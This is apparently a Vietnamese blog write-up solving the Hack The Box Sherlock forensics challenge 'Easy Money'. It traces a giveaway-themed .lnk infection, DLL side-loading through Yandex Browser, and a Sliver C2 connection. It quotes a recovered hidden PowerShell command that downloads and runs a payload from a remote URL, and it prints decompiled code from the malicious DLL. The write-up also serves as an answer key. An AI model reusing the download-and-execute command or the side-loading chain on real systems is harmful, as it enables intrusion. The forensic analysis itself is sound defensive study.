---
title: "Sherlock: Easy Money [Medium]"
date: 2026-04-23 07:22:00 +0700
categories: [SherLock]
tags: [Hackthebox, forensics]
image: /assets/images3/banner.jpg
toc: true
layout: post
---

## Description

John is an employee at a mid-sized tech company. He works as a Senior IT support specialist, but his true passion is finding ways to make extra money. John is always on the lookout for giveaways, discounts, and any opportunity to earn a quick buck. He’s not particularly tech-savvy when it comes to cybersecurity, but he’s resourceful and knows how to follow online tutorials.

Recently, John came across an enticing giveaway that promised exciting rewards. However, when he opened the giveaway, he didn’t find or win anything. This made him suspicious that something might have gone wrong with his machine. Concerned about the unusual behavior, John has reached out to you, the investigator, to uncover what happened and whether his system has been compromised.

## Solution

### Q1: At what exact time did the user execute the malicious shortcut file?

![image](/assets/images12/1.png)


Mình tiến hành check đồng thời trong 2 log `Security`, `Powershell` và `MFT entry`. Vì câu hỏi đề cập đến `shortcut` file nên filter riêng đuôi `lnk`. Thấy được user tải về 2 file shortcut sus nhất có tên `2025-GiveAways.lnk` và `Ultimate-Guide-to-Running-Giveaways.pdf.lnk`. Tiến hành check 2 file đó theo path được lưu nhưng file `2025-GiveAways.lnk` đã bị xóa và chỉ còn `Ultimate-Guide-to-Running-Giveaways.pdf.lnk` được lưu tại `Parent Path: C\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent`. Theo như đường dẫn của file còn sót lại thì đây là tệp `.lnk` được hệ điều hành Windows tự động sinh ra, chứ không phải do hacker tạo ra để lừa người dùng.

![image](/assets/images12/2.png)

Xác nhận rằng file `lnk` này được trỏ đến file pdf tại path `C:\Users\Administrator\Desktop\Ultimate-Guide-to-Running-Giveaways.pdf`

Vậy ta sẽ tập trung vào file `lnk` còn lại và đây là thông số gồm thời gian khởi tạo, thực thi,... của nó

| Parent Path                          | File Name             | Extension | Is Directory | Has Ads   | Is Ads    | File Size | Created0x10          | Created0x30          | Last Modified0x10     | Last Modified0x30     | Last Record Change0x10 | Last Record Change0x30 | Last Access0x10        | Last Access0x30        |
|--------------------------------------|-----------------------|-----------|--------------|-----------|-----------|-----------|----------------------|----------------------|------------------------|------------------------|-------------------------|-------------------------|------------------------|------------------------|
| .\Users\Administrator\Downloads      | 2025-GiveAways.lnk    | .lnk      | Unchecked    | Unchecked | Unchecked | 3018      | 2025-01-26 15:56:20  | 2025-01-26 16:17:11  | 2025-01-26 16:14:39    | 2025-01-26 16:17:11    | 2025-01-26 16:17:16     | 2025-01-26 16:17:11     | 2025-01-26 16:39:19    | 2025-01-26 16:17:11    |

Song song với đó tiến hành check trên log `Powershell` thấy được log của việc gọi powershell ra để thực hiện tải mã độc và thực thi

![image](/assets/images12/3.png)

```powershell
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -WindowStyle Hidden -Command if (!(Test-Path C:\Temp)) { New-Item -ItemType Directory -Path C:\Temp }; if (Test-Path C:\Temp\svchost.exe) { Remove-Item -Path C:\Temp\svchost.exe -Force }; Invoke-WebRequest -Uri "https://github.com/M4shl3/okiii/raw/main/svchost.exe" -OutFile "C:\Temp\svch0st.exe"; Start-Process -FilePath "C:\Temp\svch0st.exe"; Start-Sleep -Seconds 1800; Stop-Process -Name svch0st -Force; Remove-Item -Path C:\Temp\svch0st.exe -Force
```
Có thể mã độc được tải về từ `https://github.com/M4shl3/okiii/raw/main/svchost.exe` sau đó được thả xuống `C:\Temp\` và lưu dưới tên `svch0st.exe`. Chữ o được đổi thành số 0 thì đây chắc chắn là [Masquerading](https://attack.mitre.org/techniques/T1036/) rồi.


Đối chiếu timestamp tại trường `Last Record Change0x30` của `2025-GiveAways.lnk` và đoạn mã `Powershell` được khởi tạo thì thấy được timestamp là
`2025-01-26 16:17:16`. Nhưng đến đây thì mình nhập đáp án lại incorrect, mình thử spam bừa -1,-2,... giây từ timestamp trên thì đáp án đúng là `2025-01-26 16:17:15`. Hoặc ta có thể lấy dấu thời gian chính xác tại `pf` của powershell

![image](/assets/images12/4.png)

`Answer: 2025-01-26 16:17:15`

### Q2: The previous malicious file executed an initial payload. What is the full path of this payload?

Vẫn từ câu hỏi trên ta có được `full path of this payload` là `C:\Temp\svch0st.exe`

### Q3: At what timestamp did the payload execute and grant the attacker shell access?

Check pf của `svch0st.exe`

![image](/assets/images12/5.png) => `2025-01-26 16:17:54`

### Q4. What is the command line the attacker used to enumerate installed packages on the system?

![image](/assets/images12/6.png)

`Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Package`

### Q5. Which application did the attacker identify as vulnerable?

Theo các dấu vết từ `Desktop`, các file log thì có thể thấy user đang sử dụng `YandexBrowser`

![image](/assets/images12/7.png)

`Answer: YandexBrowser`

### Q6. What version of that vulnerable application did the attacker identify?

![image](/assets/images12/8.png)

`Answer: 24.4.5.498`

### Q7. What is the CVE associated with this vulnerability?

Có được tên app + version ta có thể dễ dàng xác định CVE. Thấy được CVE này nhắc đến một lỗ hổng kinh điển là việc khai thác thông qua `DLL Hijacking`

![image](/assets/images12/9.png)

### Q8. What is the name of the legitimate binary that the attacker used to deliver the malicious payload and establish persistence on the compromised system?

Sau quá trình ngồi research CVE này, mình nhận thấy khi `Yandex` chạy thì nó sẽ thực thi `browser.exe` và tiến hành nạp dll độc hại.

![image](/assets/images12/10.png)

Tức là phải có được dll trong cùng thư mục với `browser.exe`. Nên mình filter riêng thư mục chứa `browser.exe` là `C\Users\Administrator\AppData\Local\Yandex\YandexBrowser\Application` thì thấy được `wldp.dll` được drop tại đây.

![image](/assets/images12/11.png)

Mà file dll độc hại này kh tự nhiên mà có, nó phải bằng cách nào đó được drop xuống đây. Để ý xíu câu hỏi có đề cập đến `legitimate binary` và tiến hành trace lại cuộc attack thì tiếp theo mình sẽ tiến hành filter riêng các file pf được sinh ra xung quanh `svch0st.exe` (được đề cập đến ở Q3)

![image](/assets/images12/12.png)

Dễ dàng thấy được sau khi được `svch0st.exe` được thực thi thì liên tục là các lệnh nhằm `Discovery` hệ thống gồm
```
WHOAMI.EXE
NET.EXE, NET1.EXE
SYSTEMINFO.EXE
TASKS / SCHTASKS.EXE
NETSTAT.EXE
```
Và cuối cùng là `Certutil.exe`, để kiểm chứng rõ hơn thì ta dùng PEcmd để parse cái file pf này

![image](/assets/images12/13.png)

Có được 3 dòng mấu chốt sau:

```
67: ...\CryptnetUrlCache\MetaData\A16B2E6D...
68: ...\CryptnetUrlCache\Content\A16B2E6D...
82: ...\INetCache\IE\R19YII3Z\WLDP[1].DLL
83: ...\YandexBrowser\Application\WLDP.DLL
```
Sự hiện diện của các tham chiếu tệp đến `CryptNetURLCache`, `INetCache` và thư mục ứng dụng `Yandex Browser` chứng tỏ rằng `certutil` đã được sử dụng để tải xuống tệp `wldp.dll` độc hại, sau đó được ghi vào ổ đĩa và được sử dụng để khai thác lỗ hổng.

=> `certutil.exe`

### Q9. What is the name of the malicious Portable Executable (PE) file that enabled him to accomplish his objective?

Ta đã xác minh được từ Q8 ở trên => `wldp.dll`

### Q10. What is the SHA-256 hash of that malicious file?

Tìm theo path `EasyMoney\C\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\A16B2E6DE64B13EDF2C00F32C4559930`

![image](/assets/images12/15.png)

`Answer: A1A17EBD90610D808E761811D17DA3143F3DE0D4CC5EE92BD66000DCA87D9270`

### Q11. How many milliseconds of cumulative coded sleep delays occurred before the C2 binary provided a shell after the vulnerable application was launched?

Tiến hành reverse con dll kia, thông qua bảng import mình đi đến được với hàm `sub_1800748E0` 

```c++
__int64 sub_1800748E0()
{
  char *v0; // rdi
  __int64 i; // rcx
  HWND WindowW; // rax
  HANDLE CurrentProcess; // rax
  _BYTE v5[32]; // [rsp+0h] [rbp-50h] BYREF
  char v6; // [rsp+50h] [rbp+0h] BYREF
  HANDLE hObject; // [rsp+58h] [rbp+8h]
  struct _STARTUPINFOW StartupInfo; // [rsp+80h] [rbp+30h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+108h] [rbp+B8h] BYREF
  struct _STARTUPINFOW lpStartupInfo; // [rsp+140h] [rbp+F0h] BYREF
  struct _PROCESS_INFORMATION lpProcessInformation; // [rsp+1C8h] [rbp+178h] BYREF
  HWND v12; // [rsp+1F8h] [rbp+1A8h]
  char v13; // [rsp+2D4h] [rbp+284h]
  v0 = &v6;
  for ( i = 130LL; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  v13 = 0;
  sub_180070FA3(&unk_18019909F);
  hObject = CreateMutexW(0LL, 1, L"Global\\YandaExeMutex");
  if ( !hObject
    || GetLastError() == 183
    || (StartupInfo.cb = 104,
        memset(&StartupInfo.lpReserved, 0, 0x60uLL),
        lpStartupInfo.cb = 104,
        memset(&lpStartupInfo.lpReserved, 0, 0x60uLL),
        (v12 = FindWindowW(0LL, L"Yandex Browser")) != 0LL) )
  {
    CloseHandle(hObject);
  }
  else
  {
    CreateProcessW(
      L"C:\\Users\\Administrator\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe",
      0LL,
      0LL,
      0LL,
      1,
      0,
      0LL,
      0LL,
      &StartupInfo,
      &ProcessInformation);
    Sleep(0x2710u);
    WindowW = FindWindowW(0LL, L"yanda.tmp");
    v12 = WindowW;
    if ( !WindowW )
    {
      v13 = 1;
      CreateProcessW(
        L"C:\\Users\\Administrator\\AppData\\Local\\Temp\\yanda.tmp",
        0LL,
        0LL,
        0LL,
        1,
        0,
        0LL,
        0LL,
        &lpStartupInfo,
        &lpProcessInformation);
      Sleep(0x3E8u);
    }
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    if ( !v13 )
      sub_18006E7BC("proc_info2");
    CloseHandle(lpProcessInformation.hProcess);
    CloseHandle(lpProcessInformation.hThread);
    CloseHandle(hObject);
    CurrentProcess = GetCurrentProcess();
    TerminateProcess(CurrentProcess, 0);
  }
  return sub_180070742(v5, &unk_180155D10);
}
```

- Mã độc tiến hành khởi tạo mutex với tên `Global\YandaExeMutex`. Đây là kỹ thuật phổ biến để bảm bảo chỉ có 1 instance của mã độc được chạy trên hệ thống
- Khoảng trễ thứ nhất: Ngay sau khi lệnh `CreateProcessW` cho trình duyệt được gọi, có một hàm Sleep:
    - Sleep(0x2710u): Giá trị hex 0x2710 tương đương với `10,000` trong hệ `10`.
- Tiếp theo tiến hành kiểm tra C2 binary tại `C:\Users\Administrator\AppData\Local\Temp\` có tên là `yanda.tmp`
- Khoảng trễ thứ hai: Ngay sau khi thực thi yanda.tmp, có một hàm Sleep khác:
    - Sleep(0x3E8u): Giá trị hex 0x3E8 tương đương với 1,000 trong hệ 10.

=> Tổng thời gian là `11,000 ms`

### Q12. What is the mutex name used to ensure only one instance of the C2 binary runs at a time?

`Answer: Global\\YandaExeMutex`

### Q13. What is the full path of the Command and Control (C2) Binary?\

Vẫn tại câu hỏi trên

`C:\Users\Administrator\AppData\Local\Temp\yanda.tmp`

### Q14. What is the name of the C2 framework used by the attacker?

Tiến hành `search` trên gg, thì thấy được có rất nhiều bài report về `yanda.tmp` nên dễ dàng tìm được đáp án câu 13 và 14

![image](/assets/images12/18.png)

`Answer: sliver`

### Q15. What is the IP address and port number of the malicious C2 server used by the attacker?

Trong tất cả các connections thì thấy đây là connect sus nhất

![image](/assets/images12/17.png)

`Answer: 18.192.12.126:8888`

## MITRE ATT&CK

| Tactics | Techniques / Sub-techniques | ID | Behavior |
|----------------------|------------------------------------------------------|----|---------------------------------------------------|
| Initial Access | Phishing: Spearphishing Link / Attachment | T1566.002 / T1566.001 | Người dùng tải xuống file shortcut 2025-GiveAways.lnk ngụy trang dưới dạng chương trình trúng thưởng. |
| Execution | User Execution: Malicious File | T1204.002 | Người dùng thao tác thủ công (double-click) để kích hoạt file shortcut độc hại. |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Tệp .lnk kích hoạt powershell.exe với đoạn script đi kèm (-Command) để khởi tạo thư mục và tải mã độc. |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | Đổi tên payload thành svch0st.exe (thay 'o' bằng số '0') để giả mạo tiến trình hệ thống; tạo shortcut giả mạo file PDF (Ultimate-Guide-to-Running-Giveaways.pdf.lnk). |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | Script PowerShell sử dụng tham số -WindowStyle Hidden để chạy ngầm, không hiển thị cửa sổ console cho người dùng. |
| Defense Evasion | Hijack Execution Flow: DLL Side-Loading | T1574.002 | Khai thác tiến trình hợp lệ của YandexBrowser (browser.exe version 24.4.5.498) để nạp tệp thư viện độc hại wldp.dll từ cùng thư mục. |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based Evasion | T1497.003 | Mã độc C2 (yanda.tmp) sử dụng hàm Sleep() mã hóa hai khoảng thời gian (10,000 ms và 1,000 ms) tạo độ trễ 11,000 ms trước khi trả shell để vượt qua phân tích động của Sandbox. |
| Discovery | Software Discovery | T1518 | Sử dụng PowerShell cmdlet Get-Package để liệt kê các phần mềm đã cài đặt trên máy, nhắm mục tiêu tìm YandexBrowser. |
| Discovery | System Owner/User Discovery | T1033 | Thực thi WHOAMI.EXE để xác nhận đặc quyền và định danh tài khoản hiện tại. |
| Discovery | System Information Discovery | T1082 | Gọi SYSTEMINFO.EXE thu thập thông tin chi tiết về hệ điều hành, cấu hình mạng và các bản vá. |
| Discovery | Account Discovery: Local Account | T1087.001 | Chạy NET.EXE / NET1.EXE nhằm liệt kê các tài khoản và nhóm bảo mật cục bộ. |
| Discovery | System Network Connections Discovery | T1049 | Sử dụng NETSTAT.EXE để rà quét các cổng đang mở và các phiên kết nối mạng hiện hành. |
| Discovery | Scheduled Task/Job Discovery | T1053 | Thực thi TASKS / SCHTASKS.EXE rà soát các tác vụ tự động nhằm tìm kiếm vị trí thiết lập Persistence. |
| Command and Control | Ingress Tool Transfer | T1105 | Dùng Invoke-WebRequest tải payload svch0st.exe; lợi dụng LOLBin Certutil.exe tải PE file wldp.dll vào thư mục cache rồi di chuyển sang thư mục Yandex. |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Framework C2 (Sliver) thiết lập giao tiếp và truyền tải lệnh thông qua các giao thức web tiêu chuẩn (HTTP/HTTPS). |
| Command and Control | Non-Standard Port | T1571 | Beacon kết nối ngược về C2 server (IP 18.192.12.126) qua cổng 8888 nhằm lẩn tránh các bộ lọc giám sát cổng tiêu chuẩn. |

#### Done. Very good disk forensics challenge!!!